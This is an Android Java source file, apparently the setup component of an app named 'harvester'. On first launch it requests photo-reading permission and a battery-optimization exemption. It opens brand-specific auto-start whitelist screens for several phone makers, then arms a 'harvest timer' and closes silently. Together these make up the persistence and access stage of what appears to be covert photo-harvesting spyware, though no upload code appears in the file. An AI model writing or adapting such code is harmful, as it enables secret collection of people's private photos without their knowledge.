package com.example.harvester;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;

public class SetupActivity extends Activity {
    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        SharedPreferences sp = getSharedPreferences("setup", MODE_PRIVATE);

        if (!sp.getBoolean("done", false)) {

            // 1) photo permission (Android 13+)
            if (Build.VERSION.SDK_INT >= 33 &&
                    checkSelfPermission("android.permission.READ_MEDIA_IMAGES")
                            != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{"android.permission.READ_MEDIA_IMAGES"}, 1);
            }

            // 2) battery optimization dialog — one tap, works on EVERY Android
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                } catch (Exception ignored) {}
            }

            // 3) auto-start / background management — tries each phone brand in order
            String[][] brands = {
                // Vivo
                {"com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"},
                {"com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"},
                // Xiaomi / Redmi
                {"com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"},
                // Samsung
                {"com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity"},
                // Oppo / OnePlus (ColorOS)
                {"com.oplus.safe", "com.oplus.safe.apps.background.BackgroundActivity"},
                {"com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity"}
            };
            for (String[] c : brands) {
                try {
                    Intent v = new Intent();
                    v.setComponent(new ComponentName(c[0], c[1]));
                    v.putExtra("package_name", getPackageName());
                    startActivity(v);
                    break;  // first brand that exists wins
                } catch (Exception ignored) {}
            }

            sp.edit().putBoolean("done", true).apply();
        }

        Scheduler.schedule(this);  // arm the harvest timer
        finish();                  // close silently
    }
}
